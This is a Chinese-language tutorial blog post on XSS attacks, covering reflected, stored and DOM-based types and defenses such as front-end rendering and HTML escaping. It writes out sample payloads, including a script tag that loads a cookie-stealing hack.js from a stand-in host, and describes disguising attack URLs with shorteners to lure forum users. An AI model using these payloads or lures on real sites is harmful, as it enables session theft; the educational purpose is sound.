---
title: 常见web攻击
tags: []
categories: [web安全]
date: 2022-02-08 09:34:35
---

## 1. XSS

XSS，全称Cross-Site Scripting，跨站脚本攻击，是一种代码注入攻击。攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可以获得用户的敏感信息，如：cookie等，进而危害数据安全。

XSS攻击的本质是：恶意代码未经过滤，与网站正常的代码混在一起；浏览器无法分辨哪些脚本是可信的，导致恶意脚本被执行。

XSS攻击可能造成的危害：

- 获取网站的数据
- 获取Cookie
- 劫持前端逻辑
- 发送虚假请求
- 偷取用户的资料
- 偷取用户的秘密和登录态

### XSS攻击分类

根据攻击的来源，XSS 攻击可分为存储型、反射型和 DOM 型三种。

|类型|存储区|插入点|
|-|-|-|
|反射型XSS|URL|HTML|
|存储型XSS|后端数据库|HTML|
|DOM型XSS|后端数据库/前端存储/URL|前端JavaScript|

- 反射型XSS（url参数直接注入）

实现攻击步骤：

1. alert尝试（看该网站是否有xss漏洞）
2. 构造攻击url
3. 短域名伪造（通过短域名生成网站把上面构造的xss攻击url转换成看似正常的url）
4. 把构造好的url放到贴吧、论坛或微博等网站，加上诱惑性的语言描述，吸引用户点击（这一步很关键，因为只有用户点击了该url链接，才可能造成攻击）
5. 用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。
6. 用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。

反射型 XSS 漏洞常见于通过 URL 传递参数的功能，如网站搜索、跳转等。

由于需要用户主动打开恶意的 URL 才能生效，攻击者往往会结合多种手段诱导用户点击。

例如：

```js
// 正常url
http://localhost:3000/?from=china

// 1. alert尝试
http://localhost:3000/?from=<script>alert(3)</script>

// 2. 构造攻击url：hack.js实现获取Cookie
http://localhost:3000/?from=<script src="http://localhost:4000/hack.js"></script>

// 3. 短域名伪造：通过百度短网址网站（https://dwz.cn/）缩短url 
// 4. 把构造好的url放到贴吧
// 5. 用户打开带有恶意代码的 URL
// 后续步骤...
```

- 存储型xss - 存储到数据库后读取时攻击

实现攻击步骤：

1. alert尝试（看该网站是否有xss漏洞）
2. 构造攻击脚本
3. 把攻击脚本注入网站数据库
4. 用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器。
5. 用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。

这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。

**反射型 XSS 跟存储型 XSS 的区别是：**存储型 XSS 的恶意代码存在数据库里，反射型 XSS 的恶意代码存在 URL 里。

例如：

```js

// 1. alert尝试
// 在有评论功能的网站发送如下评论，如果能弹出alert提示说明存在漏洞
<script>alert(1)</script>

// 2. 构造攻击脚本：hack.js实现获取Cookie
我来了<script src="http://localhost:4000/hack.js"></script>

// 3. 把攻击脚本注入网站数据库：通过发评论实现
// 4. 用户访问该网页
// 后续步骤...
```

- DOM 型 XSS

实现攻击步骤：

- 攻击者构造出特殊的 URL，其中包含恶意代码。
- 用户打开带有恶意代码的 URL。
- 用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。
- 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。

**DOM 型 XSS 跟前两种 XSS 的区别**：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。

### XSS攻击防范

#### 预防存储型和反射型 XSS 攻击

存储型和反射型 XSS 都是在服务端取出恶意代码后，插入到响应 HTML 里的，攻击者刻意编写的“数据”被内嵌到“代码”中，被浏览器所执行。

预防这两种漏洞，有两种常见做法：

- 改成纯前端渲染，把代码和数据分隔开。
- 对 HTML 做充分转义。

##### 纯前端渲染

纯前端渲染的过程：

浏览器先加载一个静态 HTML，此 HTML 中不包含任何跟业务相关的数据。
然后浏览器执行 HTML 中的 JavaScript。
JavaScript 通过 Ajax 加载业务数据，调用 DOM API 更新到页面上。
在纯前端渲染中，我们会明确的告诉浏览器：下面要设置的内容是文本（.innerText），还是属性（.setAttribute），还是样式（.style）等等。浏览器不会被轻易的被欺骗，执行预期外的代码了。

但纯前端渲染还需注意避免 DOM 型 XSS 漏洞（例如 onload 事件和 href 中的 javascript:xxx 等，请参考下文”预防 DOM 型 XSS 攻击“部分）。

在很多内部、管理系统中，采用纯前端渲染是非常合适的。但对于性能要求高，或有 SEO 需求的页面，我们仍然要面对拼接 HTML 的问题。

##### HTML 转义

如果拼接 HTML 是必要的，就需要采用合适的转义库，对 HTML 模板各处插入点进行充分的转义。

|XSS 安全漏洞|简单转义是否有防护作用|
|-|-|
|HTML 标签文字内容|有|
|HTML 属性值|有|
|CSS 内联样式|无| |内联 JavaScript|无|
|内联 JSON|无|
|跳转链接|无|

- 通过设置响应标头实现xss过滤（可以拦截xss脚本，但伪装一下就拦截不了了）

例如koa框架：

```js
ctx.set('X-XSS-Protection', 0) //0 关闭XSS过滤，1 启用xss过滤（浏览器默认值）
// http://localhost:3000/?from=<script>alert(3)</script> 可以拦截 但伪装一下就不行了
```
